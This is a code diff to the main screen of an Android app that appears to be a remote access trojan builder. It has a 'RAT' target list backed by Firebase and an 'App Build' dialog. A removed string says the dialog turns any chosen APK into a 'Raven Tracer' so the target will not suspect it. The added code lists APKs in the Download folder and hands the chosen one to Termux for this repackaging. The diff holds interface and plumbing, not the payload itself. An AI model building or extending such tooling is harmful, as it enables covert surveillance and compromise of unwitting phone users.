@@ -11,6 +11,9 @@ import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import java.io.File;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -35,15 +38,12 @@ public class MainActivity extends AppCompatActivity {
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         mDatabase = database.getReference("target");
 
-        // ===== RAT =====
         btnRAT.setOnClickListener(v -> {
             startActivity(new Intent(this, TargetListActivity.class));
         });
 
-        // ===== APP BUILD =====
         btnAppBuild.setOnClickListener(v -> showAppBuildDialog());
 
-        // ===== NAVIGASI =====
         navBeranda.setOnClickListener(v -> setNavActive(navBeranda));
         navMenu.setOnClickListener(v -> {
             setNavActive(navMenu);
@@ -61,15 +61,69 @@ public class MainActivity extends AppCompatActivity {
 
     private void showAppBuildDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🔧 App Build");
-        builder.setMessage("Pilih APK dari storage untuk diubah menjadi Raven Tracer.\n\nTarget gak akan curiga karena APK tetap keliatan kayak aplikasi biasa.");
-        builder.setPositiveButton("📁 PILIH APK", (dialog, which) -> {
+        builder.setTitle("🐉 App Build");
+
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(20, 20, 20, 20);
+
+        // Info
+        TextView info = new TextView(this);
+        info.setText("📁 Pilih APK dari storage atau dari daftar di bawah:");
+        info.setTextColor(0xFFFFFFFF);
+        info.setPadding(0, 0, 0, 16);
+        layout.addView(info);
+
+        // List APK dari Download
+        List<String> apkList = getApkList();
+        for (String apk : apkList) {
+            Button btnApk = new Button(this);
+            btnApk.setText("📂 " + apk);
+            btnApk.setTextColor(0xFFFFFFFF);
+            btnApk.setBackgroundResource(R.drawable.dragon_card_bg);
+            btnApk.setPadding(16, 12, 16, 12);
+            btnApk.setGravity(android.view.Gravity.START);
+            btnApk.setOnClickListener(v -> {
+                String apkPath = "/sdcard/Download/" + apk;
+                sendToTermux(apkPath);
+            });
+            layout.addView(btnApk);
+            // Spacer
+            View spacer = new View(this);
+            spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 8));
+            layout.addView(spacer);
+        }
+
+        // Tombol Pilih APK
+        Button btnPilih = new Button(this);
+        btnPilih.setText("🔥 CARI APK LAIN 🔥");
+        btnPilih.setTextColor(0xFFFFFFFF);
+        btnPilih.setBackgroundResource(R.drawable.dragon_btn);
+        btnPilih.setPadding(16, 16, 16, 16);
+        btnPilih.setOnClickListener(v -> {
             Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
             intent.setType("application/vnd.android.package-archive");
             startActivityForResult(intent, REQUEST_APP_BUILD);
         });
-        builder.setNegativeButton("Batal", null);
+        layout.addView(btnPilih);
+
+        builder.setView(layout);
+        builder.setNegativeButton("🐉 TUTUP", null);
         builder.show();
+    }
+
+    private List<String> getApkList() {
+        List<String> apks = new ArrayList<>();
+        File dir = new File("/sdcard/Download/");
+        if (dir.exists() && dir.isDirectory()) {
+            File[] files = dir.listFiles((d, name) -> name.endsWith(".apk"));
+            if (files != null) {
+                for (File f : files) {
+                    apks.add(f.getName());
+                }
+            }
+        }
+        return apks;
     }
 
     private void setNavActive(TextView active) {
@@ -141,4 +195,4 @@ public class MainActivity extends AppCompatActivity {
             return false;
         }
     }
-            }
+}
